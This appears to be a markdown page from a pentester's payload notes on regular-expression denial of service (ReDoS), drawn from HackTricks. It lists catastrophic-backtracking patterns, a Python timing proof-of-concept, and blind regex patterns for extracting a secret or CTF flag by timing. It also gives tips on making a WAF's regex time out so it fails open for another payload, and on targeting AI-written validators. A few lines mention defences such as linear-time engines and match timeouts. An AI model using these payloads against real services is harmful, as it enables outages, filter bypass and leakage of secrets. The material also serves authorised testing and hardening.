---
title: "Payloads: ReDoS"
type: payloads
tags: [payloads, redos, dos, regex, web]
sources: [hacktricks-web]
date_created: 2026-07-14
date_updated: 2026-11-11
---

# Payloads: ReDoS

Evil-regex denial-of-service and blind regex exfiltration primitives. See [[techniques/web/redos]].

## Evil patterns (all catastrophic on `"a"*N + "!"`)
```
(a+)+       ([a-zA-Z]+)*      (a|aa)+      (a|a?)+     (.*a){100}
(\w*)+$     (a*)+$            (a+)*$       (a|a?)+$    (a?){100}$
```

## PoC recipe
Prefix into the vulnerable subpattern, long ambiguous run (`a`/`_`/space), then a final
char that forces total failure so the engine backtracks all paths. Grow N by 2^k and watch latency.
```python
import re,time
pat=re.compile(r'(\w*_)\w*$')
for n in [2**k for k in range(8,15)]:
    s='v'+'_'*n+'!'; t=time.time(); pat.search(s); print(n, f"{time.time()-t:.3f}s")
```

## Blind regex exfiltration (you control the regex a secret is matched with; time = matched)
```
^(?=<known_prefix>)((.*)*)*salt$
^(?=HTB{sOmE_fl<guess>).*.*.*.*.*.*.*.*!!!!$
<flag>(((((((.*)*)*)*)*)*)*)!
```

Immune engines (pivot away): RE2/RE2J/RE2JS, Rust regex. Tools: regexploit, redos-checker.

Source: HackTricks (pentesting-web)

## NEW 2025-2026

1. **ReDoS the WAF, not just the app**: catastrophic-backtracking input against a
   WAF/CDN rule regex that times out and FAILS OPEN = a bypass window for the real
   payload; test regex-bearing rules (custom rules, bot detection) with nested
   repetitions before the actual injection.
2. **LLM-generated validators as a ReDoS source** (2025-26 class): AI-assisted code
   shipping hand-rolled email/password regexes; audit any "clever" regex in
   server-side validation libs the target discloses (stack fingerprint).
3. **SoK anchor**: the 2025 Systematization of Knowledge on ReDoS catalogs detection
   (static analyzers vs runtime) and the engineering gap - defense still =
   linear-time engines (RE2/Rust regex) or match timeouts, not regex review.
4. **Impact framing**: auth-endpoint ReDoS = account-lockout-adjacent DoS (one
   request per worker); report at the endpoint, not the regex.
